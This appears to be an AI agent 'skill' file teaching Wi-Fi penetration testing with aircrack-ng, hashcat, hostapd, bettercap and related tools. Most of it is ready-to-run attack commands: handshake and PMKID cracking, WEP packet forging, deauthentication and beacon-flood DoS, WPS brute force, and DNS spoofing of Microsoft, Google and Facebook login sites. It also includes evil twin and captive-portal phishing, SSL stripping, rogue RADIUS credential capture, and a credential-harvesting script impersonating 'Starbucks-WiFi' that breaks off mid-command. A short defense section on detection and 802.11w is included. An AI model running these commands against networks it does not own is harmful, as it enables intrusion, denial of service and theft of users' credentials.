---
name: wireless-security-wifi-penetration-testing
description: Master Wi-Fi penetration testing with aircrack-ng, monitor mode, WEP/WPA/WPA2/WPA3 cracking, rogue APs, and wireless MITM attacks
triggers:
  - how do I crack WPA2 handshakes
  - put my wireless adapter in monitor mode
  - capture WPA handshake with aircrack-ng
  - create evil twin access point
  - crack WEP encryption wireless
  - deauth clients from wifi network
  - test wireless network security
  - perform wifi penetration testing
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides expertise in wireless security assessment and Wi-Fi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 wireless standards, encryption protocols (WEP/WPA/WPA2/WPA3), monitor mode packet capture, handshake cracking, rogue access points, and wireless MITM attacks.

## Overview

The Wireless Security & WiFi Penetration Testing project is a comprehensive, lab-driven curriculum covering:

- **802.11 fundamentals**: Frames, channels, authentication, encryption
- **Adapter configuration**: Monitor mode, packet injection, chipset compatibility
- **Reconnaissance**: SSID enumeration, hidden networks, traffic analysis
- **WEP attacks**: IV collection, statistical cracking, ChopChop, fragmentation, Caffe Latte
- **WPA/WPA2 attacks**: Handshake capture, PMKID extraction, dictionary/GPU cracking
- **WPA3 attacks**: Dragonblood, downgrade attacks
- **Rogue APs**: Evil twin, captive portals, credential harvesting
- **Wireless MITM**: Traffic interception, SSL stripping
- **Enterprise WPA**: EAP/RADIUS assessment
- **Defensive measures**: Detection, hardening, 802.11w

**Core toolchain**: aircrack-ng, airodump-ng, aireplay-ng, hashcat, hcxdumptool, kismet, hostapd, bettercap

## Prerequisites

### Hardware Requirements

**Essential**: Injection-capable wireless adapter with one of these chipsets:
- **Atheros AR9271** (recommended) - e.g., TP-Link TL-WN722N v1, Alfa AWUS036NHA
- **Ralink RT3070/RT5372** - e.g., Alfa AWUS036NH, Panda PAU05
- **Realtek RTL8812AU** (newer) - limited injection support

**Lab setup**:
- 1-2 wireless adapters (one for monitoring, one for rogue AP)
- Test access point you own (for WEP/WPA/WPA2 practice)
- Client devices (phones/laptops for handshake generation)

### Software Requirements

**Base system**: Kali Linux (preferred) or any Linux with kernel support

**Core tools** (pre-installed on Kali):
```bash
# Verify aircrack-ng suite
aircrack-ng --help
airodump-ng --help
aireplay-ng --help

# Install if missing
sudo apt update
sudo apt install -y aircrack-ng \
  hashcat \
  hcxdumptool \
  hcxtools \
  kismet \
  wireshark \
  hostapd \
  dnsmasq \
  reaver \
  bully
```

## Adapter Setup & Monitor Mode

### Check Adapter Compatibility

```bash
# List wireless interfaces
iwconfig
ip link show

# Check chipset driver
lsusb
lspci | grep -i wireless

# Verify monitor mode support
sudo iw list | grep -A 10 "Supported interface modes"
```

### Enable Monitor Mode (Method 1: airmon-ng)

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Verify monitor mode
iwconfig wlan0mon
# Should show "Mode:Monitor"

# Test packet injection
sudo aireplay-ng --test wlan0mon
# Should show "Injection is working!"
```

### Enable Monitor Mode (Method 2: iw/ip)

```bash
# Bring interface down
sudo ip link set wlan0 down

# Set monitor mode
sudo iw dev wlan0 set type monitor

# Bring interface up
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
```

### Disable Monitor Mode

```bash
# Using airmon-ng
sudo airmon-ng stop wlan0mon

# Restart network manager
sudo systemctl start NetworkManager

# Or manually
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

## Wireless Reconnaissance

### Basic Network Discovery

```bash
# Scan all channels (2.4GHz and 5GHz)
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng --channel 6 wlan0mon

# Scan specific band
sudo airodump-ng --band a wlan0mon  # 5GHz only
sudo airodump-ng --band bg wlan0mon # 2.4GHz only

# Write captures to file
sudo airodump-ng -w capture --output-format pcap wlan0mon
```

### Target Specific Network

```bash
# Focus on specific BSSID and channel
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  -w target-capture \
  wlan0mon
```

### Discover Hidden SSIDs

```bash
# Start monitoring target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# In another terminal, deauth a client to capture probe requests
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:HERE \
  wlan0mon
# Hidden SSID will appear when client reconnects
```

### Advanced Discovery with Kismet

```bash
# Start kismet (creates web UI on http://localhost:2501)
sudo kismet

# Or headless mode
sudo kismet -c wlan0mon --override wardrive

# Export to CSV/JSON
sudo kismet_cap_linux_wifi --source=wlan0mon \
  --capture-dir=/tmp/kismet-captures
```

## WEP Attacks

### WEP Cracking (ARP Replay Attack)

```bash
# 1. Start capture on target channel
sudo airodump-ng -c 6 --bssid TARGET_BSSID \
  -w wep-capture \
  wlan0mon

# 2. Fake authentication (if needed)
sudo aireplay-ng --fakeauth 0 \
  -a TARGET_BSSID \
  -h YOUR_ADAPTER_MAC \
  wlan0mon

# 3. ARP replay attack to generate IVs
sudo aireplay-ng --arpreplay \
  -b TARGET_BSSID \
  -h YOUR_ADAPTER_MAC \
  wlan0mon

# 4. Crack when IVs > 50,000
sudo aircrack-ng wep-capture-01.cap
```

### WEP ChopChop Attack

```bash
# Run ChopChop to decrypt a packet
sudo aireplay-ng --chopchop \
  -b TARGET_BSSID \
  -h YOUR_ADAPTER_MAC \
  wlan0mon
# Saves decrypted packet to replay-*.xor

# Create ARP packet from decrypted data
sudo packetforge-ng --arp \
  -a TARGET_BSSID \
  -h CLIENT_MAC \
  -k 192.168.1.1 \
  -l 192.168.1.100 \
  -y replay-*.xor \
  -w arp-packet

# Inject crafted packet
sudo aireplay-ng --interactive \
  -r arp-packet \
  wlan0mon
```

### WEP Fragmentation Attack

```bash
# Fragment attack to get PRGA keystream
sudo aireplay-ng --fragment \
  -b TARGET_BSSID \
  -h YOUR_ADAPTER_MAC \
  wlan0mon
# Creates fragment-*.xor file

# Use PRGA to forge packets
sudo packetforge-ng --arp \
  -a TARGET_BSSID \
  -h CLIENT_MAC \
  -k 192.168.1.1 \
  -l 192.168.1.100 \
  -y fragment-*.xor \
  -w forged-packet

sudo aireplay-ng --interactive -r forged-packet wlan0mon
```

## WPA/WPA2 Attacks

### Capture WPA Handshake

```bash
# 1. Start capture on target
sudo airodump-ng -c 6 --bssid TARGET_BSSID \
  -w wpa-capture \
  wlan0mon

# 2. Deauthenticate a client to force reconnection
sudo aireplay-ng --deauth 10 \
  -a TARGET_BSSID \
  -c CLIENT_MAC \
  wlan0mon
# Watch airodump-ng for "WPA handshake: TARGET_BSSID" message

# 3. Verify handshake capture
aircrack-ng wpa-capture-01.cap
# Should show "1 handshake"
```

### Crack WPA/WPA2 with Dictionary

```bash
# CPU-based cracking
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b TARGET_BSSID \
  wpa-capture-01.cap

# With specific ESSID
sudo aircrack-ng -w wordlist.txt \
  -e "NetworkName" \
  wpa-capture-01.cap
```

### GPU Cracking with Hashcat

```bash
# Convert cap to hccapx format (hashcat 3.6+)
hcxpcapngtool -o hash.hc22000 wpa-capture-01.cap

# Or for older hashcat
cap2hccapx wpa-capture-01.cap hash.hccapx

# Crack with hashcat (mode 22000 for WPA*2/PMKID)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# GPU-accelerated with rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

### PMKID Attack (Clientless)

```bash
# Capture PMKID (no client needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=targets.txt \
  --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 pmkid.hc22000 wordlist.txt

# Or targeted PMKID capture
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=AA:BB:CC:DD:EE:FF
```

### Precomputed Table Attack (Cowpatty)

```bash
# Generate rainbow table for specific SSID
genpmk -f wordlist.txt -d pmk-database -s "NetworkSSID"

# Crack using precomputed PMKs
cowpatty -d pmk-database \
  -r wpa-capture-01.cap \
  -s "NetworkSSID"

# Or use pyrit for distributed cracking
pyrit -r wpa-capture-01.cap \
  -i wordlist.txt \
  attack_passthrough
```

## WPA3 Attacks

### Dragonblood Downgrade Attack

```bash
# Force downgrade to WPA2 (if WPA3-transition mode)
# Using hostapd-wpe or modified hostapd

# 1. Create rogue AP with same SSID
cat > hostapd-downgrade.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=TARGET_NETWORK
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=TemporaryPass123
EOF

# 2. Run rogue AP
sudo hostapd hostapd-downgrade.conf

# 3. Deauth clients from real AP
sudo aireplay-ng --deauth 0 -a REAL_AP_BSSID wlan0mon

# 4. Capture WPA2 handshake when clients connect to rogue AP
```

### WPA3 SAE (Dragonfly) Timing Attack

```bash
# Use dragonslayer toolkit
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test for timing leak vulnerability
sudo ./krackattacks-scripts/krack-test-client.py

# Or use wpa_supplicant with SAE
sudo wpa_supplicant -i wlan0 -c sae-test.conf
```

## Evil Twin / Rogue Access Point

### Basic Evil Twin with hostapd

```bash
# 1. Create hostapd configuration
cat > evil-twin.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=CoffeeShop-WiFi
channel=6
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# 2. Start rogue AP
sudo hostapd evil-twin.conf

# 3. In another terminal, deauth clients from real AP
sudo aireplay-ng --deauth 0 \
  -a REAL_AP_BSSID \
  wlan0mon
```

### Evil Twin with WPA2 and Captive Portal

```bash
# 1. Configure hostapd with WPA2
cat > evil-wpa.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=SecureNetwork
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=TemporaryPass123
EOF

# 2. Configure dnsmasq for DHCP
cat > dnsmasq-evil.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
address=/#/192.168.100.1
EOF

# 3. Set up IP forwarding and NAT
sudo ip addr add 192.168.100.1/24 dev wlan0mon
sudo ip link set wlan0mon up
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 4. Start services
sudo dnsmasq -C dnsmasq-evil.conf -d &
sudo hostapd evil-wpa.conf

# 5. Set up captive portal (nginx/apache with login page)
# Redirect all HTTP to captive portal IP
sudo iptables -t nat -A PREROUTING -i wlan0mon -p tcp --dport 80 \
  -j DNAT --to-destination 192.168.100.1:80
```

### Automated Evil Twin with Wifiphisher

```bash
# Install wifiphisher
sudo apt install wifiphisher

# Run automated evil twin attack
sudo wifiphisher -i wlan0mon

# With specific template
sudo wifiphisher -i wlan0mon -e "CoffeeShop-WiFi" \
  -p firmware-upgrade

# Custom phishing page
sudo wifiphisher -i wlan0mon -e "TARGET_SSID" \
  -p custom-page -eI wlan1mon
```

### Evil Twin with WiFi Pumpkin 3

```bash
# Install WiFi Pumpkin 3
sudo apt install wifipumpkin3

# Run interactively
sudo wifipumpkin3

# Commands in wifipumpkin shell:
# set interface wlan0mon
# set ssid "Public WiFi"
# set proxy noproxy
# start
```

## Wireless MITM Attacks

### SSL Stripping with Bettercap

```bash
# Start bettercap on rogue AP interface
sudo bettercap -iface wlan0mon

# In bettercap console:
# set http.proxy.sslstrip true
# set net.sniff.verbose true
# http.proxy on
# net.sniff on

# Or with caplet file
cat > wifi-mitm.cap << 'EOF'
set http.proxy.sslstrip true
set net.sniff.verbose true
set net.sniff.local true
http.proxy on
net.sniff on
EOF

sudo bettercap -iface wlan0mon -caplet wifi-mitm.cap
```

### Credential Harvesting

```bash
# Capture credentials with Wireshark filter
sudo wireshark -i wlan0mon -k -f "tcp port 80 or tcp port 21"

# Wireshark display filter for credentials:
# http.request.method == "POST"
# ftp.request.command == "USER" or ftp.request.command == "PASS"

# Or use tcpdump
sudo tcpdump -i wlan0mon -n -A -s0 \
  'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' \
  -w http-traffic.pcap
```

### DNS Spoofing on Rogue AP

```bash
# Configure dnsmasq for DNS spoofing
cat > dns-spoof.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.100.10,192.168.100.100,12h
address=/login.microsoft.com/192.168.100.1
address=/accounts.google.com/192.168.100.1
address=/facebook.com/192.168.100.1
EOF

sudo dnsmasq -C dns-spoof.conf -d
```

## WPS Attacks

### WPS PIN Attack with Reaver

```bash
# Check if WPS is enabled
sudo wash -i wlan0mon

# Reaver attack (online PIN bruteforce)
sudo reaver -i wlan0mon \
  -b TARGET_BSSID \
  -c 6 \
  -vv \
  -d 2 \
  -T 0.5 \
  -r 3:15

# With pixie dust attack
sudo reaver -i wlan0mon \
  -b TARGET_BSSID \
  -c 6 \
  -K 1 \
  -vv
```

### WPS Attack with Bully

```bash
# Standard WPS attack
sudo bully -b TARGET_BSSID \
  -c 6 \
  -e TARGET_ESSID \
  wlan0mon

# Pixie dust attack
sudo bully -b TARGET_BSSID \
  -c 6 \
  -d \
  wlan0mon
```

## Deauthentication Attacks

### Targeted Deauth

```bash
# Deauth specific client
sudo aireplay-ng --deauth 10 \
  -a AP_BSSID \
  -c CLIENT_MAC \
  wlan0mon

# Deauth all clients (broadcast)
sudo aireplay-ng --deauth 0 \
  -a AP_BSSID \
  wlan0mon
```

### Continuous Deauth (DoS)

```bash
# Continuous deauth (Ctrl+C to stop)
sudo aireplay-ng --deauth 0 \
  -a TARGET_BSSID \
  wlan0mon

# Or with mdk4 (more aggressive)
sudo mdk4 wlan0mon d -c 6 -b targets.txt
# targets.txt contains one BSSID per line
```

### Beacon Flood Attack

```bash
# Flood with fake APs (DoS)
sudo mdk4 wlan0mon b -f fake-ssids.txt -c 6

# Random SSID beacon flood
sudo mdk4 wlan0mon b -a -w n -c 6
```

## Enterprise WPA (EAP/RADIUS) Testing

### Capture EAP Handshake

```bash
# Monitor enterprise network
sudo airodump-ng -c 6 --bssid ENTERPRISE_BSSID \
  -w eap-capture \
  wlan0mon

# Deauth to capture EAP challenge/response
sudo aireplay-ng --deauth 5 \
  -a ENTERPRISE_BSSID \
  -c CLIENT_MAC \
  wlan0mon
```

### Rogue RADIUS with hostapd-wpe

```bash
# Install hostapd-wpe
sudo apt install hostapd-wpe

# Configure evil twin with enterprise auth
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=Corporate-WiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
EOF

# Run hostapd-wpe to capture credentials
sudo hostapd-wpe hostapd-wpe.conf

# Credentials saved to /var/log/hostapd-wpe.log
# or /var/lib/hostapd-wpe/hostapd-wpe.log
```

### Crack EAP Credentials

```bash
# Extract challenge/response from hostapd-wpe log
# Format: asleap -C challenge -R response -W wordlist

# Example from log
asleap -C 11:22:33:44:55:66:77:88 \
  -R aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99:00:11:22:33:44:55:66 \
  -W /usr/share/wordlists/rockyou.txt

# Or use hashcat for MSCHAPv2
hashcat -m 5500 eap-hash.txt wordlist.txt
```

## Detection & Defense

### Detect Rogue APs with Kismet

```bash
# Run kismet with alerts enabled
sudo kismet -c wlan0mon --override wardrive

# Check for:
# - Multiple APs with same SSID (evil twin)
# - Unexpected channels
# - Deauth floods
# - WPS bruteforce attempts
```

### Monitor for Deauth Attacks

```bash
# tcpdump filter for deauth frames
sudo tcpdump -i wlan0mon -e -s 256 type mgt subtype deauth

# Or with Wireshark
sudo wireshark -i wlan0mon -k -f "wlan type mgt subtype deauth"
```

### Enable 802.11w (Management Frame Protection)

```bash
# In hostapd.conf (AP side)
cat >> /etc/hostapd/hostapd.conf << 'EOF'
wpa=2
wpa_key_mgmt=WPA-PSK
ieee80211w=2  # required (1=optional, 2=required)
EOF

# Client side (wpa_supplicant)
cat >> /etc/wpa_supplicant/wpa_supplicant.conf << 'EOF'
network={
    ssid="SecureNetwork"
    psk="YourPassword"
    ieee80211w=2
}
EOF
```

## Troubleshooting

### Adapter Won't Enter Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill
sudo systemctl stop NetworkManager

# Reset adapter
sudo ip link set wlan0 down
sudo ip link set wlan0 up

# Check for hardware/firmware issues
dmesg | grep -i wlan
sudo modprobe -r rtl8xxxu  # example for Realtek
sudo modprobe rtl8xxxu

# Try different method
sudo iw dev wlan0 interface add mon0 type monitor
sudo ip link set mon0 up
```

### Packet Injection Fails

```bash
# Test injection thoroughly
sudo aireplay-ng --test wlan1mon

# If fails:
# 1. Wrong chipset (non-injection capable)
lsusb  # confirm chipset

# 2. Wrong driver
# Use kernel driver, not vendor driver
sudo modprobe -r rtl8192cu  # remove wrong driver
sudo modprobe rtl8xxxu      # load correct driver

# 3. Regulatory domain
sudo iw reg get
sudo iw reg set US  # or your country code

# 4. VM USB passthrough issue
# Use bare metal or fix USB controller passthrough
```

### No Handshake Captured

```bash
# Verify client is connected
sudo airodump-ng -c 6 --bssid TARGET_BSSID wlan0mon
# Check "# clients" column

# Increase deauth packet count
sudo aireplay-ng --deauth 20 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Try broadcast deauth
sudo aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Check capture for handshake frames (EAPOL)
tshark -r capture.cap -Y "eapol"
```

### Clients Won't Connect to Evil Twin

```bash
# Match original AP settings exactly
# - SSID (case-sensitive)
# - Channel
# - Encryption type
# - Beacon interval

# Check signal strength
sudo iwconfig wlan0mon txpower 20  # increase if needed

# Verify hostapd is broadcasting
sudo hostapd -dd evil-twin.conf  # debug mode

# Check for mac address filtering on client
# Spoof original AP MAC
sudo macchanger -m ORIGINAL_AP_MAC wlan0mon
```

### Cracking Takes Too Long

```bash
# Use GPU acceleration
hashcat -m 22000 hash.hc22000 wordlist.txt -O -w 3

# Use rule-based attacks instead of huge wordlists
hashcat -m 22000 hash.hc22000 small-wordlist.txt -r rules/best64.rule

# Use masks for known password patterns
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?d?d?d?d

# Distributed cracking with hashtopolis or pyrit
```

### PMKID Not Captured

```bash
# Not all APs support PMKID
# Try different hcxdumptool options
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=15 \
  --filtermode=2

# Try legacy hcxtools
sudo hcxpcaptool -z pmkid.16800 capture.pcapng

# Verify AP supports RSN (not just WPA)
sudo airodump-ng wlan0mon
# Look for "WPA2" in encryption column
```

## Real-World Attack Workflow

### Complete WPA2 Assessment

```bash
#!/bin/bash
# Full WPA2 penetration test script

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL=6
TARGET_ESSID="CorporateWiFi"
INTERFACE="wlan0"
CAPTURE_PREFIX="pentest-$(date +%Y%m%d-%H%M%S)"

# 1. Enable monitor mode
echo "[*] Enabling monitor mode..."
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE
MON_INTERFACE="${INTERFACE}mon"

# 2. Start capture
echo "[*] Starting capture on channel $TARGET_CHANNEL..."
sudo airodump-ng -c $TARGET_CHANNEL \
  --bssid $TARGET_BSSID \
  -w $CAPTURE_PREFIX \
  $MON_INTERFACE &
AIRODUMP_PID=$!
sleep 5

# 3. Deauth to capture handshake
echo "[*] Sending deauth packets..."
sudo aireplay-ng --deauth 20 \
  -a $TARGET_BSSID \
  $MON_INTERFACE

# 4. Wait and verify handshake
echo "[*] Waiting for handshake..."
sleep 30
kill $AIRODUMP_PID

# 5. Verify handshake
if sudo aircrack-ng ${CAPTURE_PREFIX}-01.cap | grep -q "1 handshake"; then
    echo "[+] Handshake captured successfully!"
    
    # 6. Convert for hashcat
    hcxpcapngtool -o ${CAPTURE_PREFIX}.hc22000 ${CAPTURE_PREFIX}-01.cap
    
    # 7. Crack with GPU
    echo "[*] Starting hashcat..."
    hashcat -m 22000 ${CAPTURE_PREFIX}.hc22000 \
      /usr/share/wordlists/rockyou.txt \
      -O -w 3
else
    echo "[-] No handshake captured. Retry."
fi

# 8. Cleanup
sudo airmon-ng stop $MON_INTERFACE
sudo systemctl start NetworkManager
```

### Evil Twin Credential Harvesting

```bash
#!/bin/bash
# Automated evil twin with captive portal

TARGET_SSID="Starbucks-WiFi"
PHISH_INTERFACE="wlan0mon"
INTERNET_INTERFACE="eth0"

# 1. Configure IP
sudo ip addr add 192.168.100.1/24 dev $PHISH_INTERFACE
sudo ip link set $PHISH_INTERFACE up

# 2. Create hostapd config
cat > /tmp/evil-ap.conf << EOF
interface=$PHISH_INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=6
hw_mode=g
EOF

# 3. Create dnsmasq config
cat > /tmp/evil-dns.conf << EOF
interface=$PHISH_INTERFACE
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
address=/#/192.168.100.1
EOF

# 4. Enable forwarding and NAT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE
sudo iptables -t nat -A PRERO
